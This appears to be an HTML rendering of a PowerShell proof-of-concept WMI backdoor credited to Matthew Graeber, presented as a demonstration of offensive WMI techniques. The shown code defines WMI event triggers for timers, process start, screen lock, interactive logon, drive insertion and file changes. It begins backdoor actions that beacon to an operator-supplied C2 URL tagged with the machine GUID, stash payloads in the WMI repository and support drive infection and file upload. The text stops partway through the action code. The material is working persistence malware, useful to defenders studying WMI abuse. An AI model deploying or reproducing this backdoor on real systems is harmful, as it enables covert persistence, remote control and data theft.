<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>WMI_Backdoor_Client.ps1</title>
</head><body>#https://github.com/mattifestation/WMI_Backdoor/blob/master/WMIBackdoor.ps1<br/>
#<b>THIS DOESN"T INCLUDE THE SERVER PORTION</b><br/>
&lt;#<br/>
PoC WMI backdoor. This is a crude WMI backdoor (that doesn't include<br/>
a C2 server component) used for demonstration purposes only and to<br/>
demonstrate offensive WMI techniques. No further weaponization will<br/>
be performed. I will not respond to issues or pull requests.<br/>
<br/>
Author: Matthew Graeber (@mattifestation)<br/>
License: BSD 3-Clause<br/>
#&gt;<br/>
<br/>
Function New-WMIBackdoorTrigger {<br/>
&nbsp; &nbsp; Param (<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'Interval')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [UInt32]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $TimingInterval,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'AbsoluteDatetime')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [DateTime]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Datetime,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(ParameterSetName = 'Interval')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(ParameterSetName = 'AbsoluteDatetime')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateNotNullOrEmpty()]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $TimerName = 'Timer',<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'ProcessStart')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateNotNullOrEmpty()]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $ProcessName,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'NewOrModifiedFile')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateScript({ foreach ($Ext in $_) {(!$Ext.Contains('.')) -and ($Ext.Length)} })]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String[]]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $NewOrModifiedFileExtensions,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'LockedScreen')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $LockedScreen,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'InteractiveLogon')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $InteractiveLogon,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'DriveInsertion')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $DriveInsertion,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateNotNullOrEmpty()]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $TriggerName<br/>
&nbsp; &nbsp; )<br/>
<br/>
&nbsp; &nbsp; switch ($PsCmdlet.ParameterSetName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'Interval' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($TriggerName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $TriggerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'TimingIntervalTrigger'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Convert minutes to milliseconds<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $IntervalMS = $TimingInterval * 60000<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventNameSpace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Use $TimerName and $IntervalMS as out of band information to be used by Register-WMIBackdoor<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # This is kind of ugly but I wanted to maintain strict function separation for event triggers,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # payloads, and registration.<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.TimingInterval.$TimerName.$IntervalMS")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $Result<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'AbsoluteDatetime' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($TriggerName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $TriggerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'DatetimeTrigger'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $DMTFTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime($Datetime).Replace('.','_')<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventNameSpace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.DateTime.$TimerName.$DMTFTime")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $Result<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'ProcessStart' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($TriggerName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $TriggerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'ProcessStartTrigger'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventNameSpace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = '$ProcessName'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.ProcessStart")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $Result<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'LockedScreen' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($TriggerName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $TriggerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'LockedScreenTrigger'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventNameSpace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Query = 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = "LogonUI.exe"'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.LockedScreen")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $Result<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'InteractiveLogon' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($TriggerName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $TriggerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'InteractiveLogonTrigger'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventNameSpace = 'ROOT\subscription'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.InteractiveLogon")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $Result<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'DriveInsertion' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($TriggerName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $TriggerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'DriveInsertionTrigger'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventNameSpace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.DriveInsertion")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $Result<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'NewOrModifiedFile' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($TriggerName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $TriggerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'NewOrModifiedFileTrigger'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $QueryExtensions = ($NewOrModifiedFileExtensions | % { "TargetInstance.Extension = `"$_`"" }) -join ' OR '<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventNameSpace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Query = "SELECT * FROM __InstanceOperationEvent WITHIN 30 WHERE ((__CLASS = `"__InstanceCreationEvent`" OR __CLASS = `"__InstanceModificationEvent`") AND TargetInstance ISA `"CIM_DataFile`") AND ($QueryExtensions)"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.NewOrModifiedFile")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $Result<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; }<br/>
}<br/>
<br/>
Function New-WMIBackdoorAction {<br/>
&nbsp; &nbsp; Param (<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Uri]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $C2Uri,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Backdoor,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'KillProcess')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $KillProcess,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'InfectDrive')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $InfectDrive,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $FileUpload,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateNotNullOrEmpty()]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $ActionName<br/>
&nbsp; &nbsp; )<br/>
<br/>
&nbsp; &nbsp; $Base64Decoder = @'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ' Decodes a base-64 encoded string (BSTR type).<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ' 1999 - 2004 Antonin Foller, http://www.motobit.com<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ' 1.01 - solves problem with Access And 'Compare Database' (InStr)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Function Base64Decode(ByVal base64String)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'rfc1521<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; '1999 Antonin Foller, Motobit Software, http://Motobit.cz<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim dataLength, sOut, groupBegin<br/>
&nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'remove white spaces, If any<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; base64String = Replace(base64String, vbCrLf, "")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; base64String = Replace(base64String, vbTab, "")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; base64String = Replace(base64String, " ", "")<br/>
&nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'The source must consists from groups with Len of 4 chars<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dataLength = Len(base64String)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If dataLength Mod 4 &lt;&gt; 0 Then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Err.Raise 1, "Base64Decode", "Bad Base64 string."<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Exit Function<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
<br/>
&nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Now decode each group:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; For groupBegin = 1 To dataLength Step 4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Each data group encodes up To 3 actual bytes.<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; numDataBytes = 3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; nGroup = 0<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; For CharCounter = 0 To 3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Convert each character into 6 bits of data, And add it To<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' an integer For temporary storage. &nbsp;If a character is a '=', there<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' is one fewer data byte. &nbsp;(There can only be a maximum of 2 '=' In<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' the whole string.)<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; thisChar = Mid(base64String, groupBegin + CharCounter, 1)<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If thisChar = "=" Then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; numDataBytes = numDataBytes - 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; thisData = 0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Else<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If thisData = -1 Then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Err.Raise 2, "Base64Decode", "Bad character In Base64 string."<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Exit Function<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; nGroup = 64 * nGroup + thisData<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Next<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Hex splits the long To 6 groups with 4 bits<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; nGroup = Hex(nGroup)<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Add leading zeros<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; nGroup = String(6 - Len(nGroup), "0") &amp; nGroup<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'Convert the 3 byte hex integer (6 chars) To 3 characters<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pOut = Chr(CByte("&amp;H" &amp; Mid(nGroup, 1, 2))) + _<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Chr(CByte("&amp;H" &amp; Mid(nGroup, 3, 2))) + _<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Chr(CByte("&amp;H" &amp; Mid(nGroup, 5, 2)))<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'add numDataBytes characters To out string<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sOut = sOut &amp; Left(pOut, numDataBytes)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Next<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Base64Decode = sOut<br/>
&nbsp; &nbsp; &nbsp; &nbsp; End Function<br/>
'@<br/>
<br/>
&nbsp; &nbsp; switch ($PsCmdlet.ParameterSetName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'Backdoor' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $VBScript = @"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Option Explicit<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; On Error Resume Next<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim oXMLHTTP, oReg, aC2URL, aCmdType, aClassName, aPropertyName, aPayload, aMachineGuid<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oReg.GetStringValue &amp;H80000002, "SOFTWARE\Microsoft\Cryptography", "MachineGuid", aMachineGuid<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; aC2URL = "$($C2Uri.AbsoluteUri)index.html&amp;ID=" &amp; aMachineGuid<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sub StorePayloadInWMIRepo(classname, propertyname, payload)<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Dim oLocation, oServices, oDataObject<br/>
&#09;<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oLocation = CreateObject("WbemScripting.SWbemLocator")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oServices = oLocation.ConnectServer(, "root\cimv2")<br/>
&#09;<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oDataObject = oServices.Get<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;oDataObject.Path_.Class = classname<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;oDataObject.Properties_.Add(propertyname, 8).Value = payload<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;oDataObject.Put_<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End Sub<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sub DeleteWMIClass(classname, propertyname)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim oLocation, oServices, oDataObject<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oLocation = CreateObject("WbemScripting.SWbemLocator")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oServices = oLocation.ConnectServer(, "root\cimv2")<br/>
&#09;<br/>
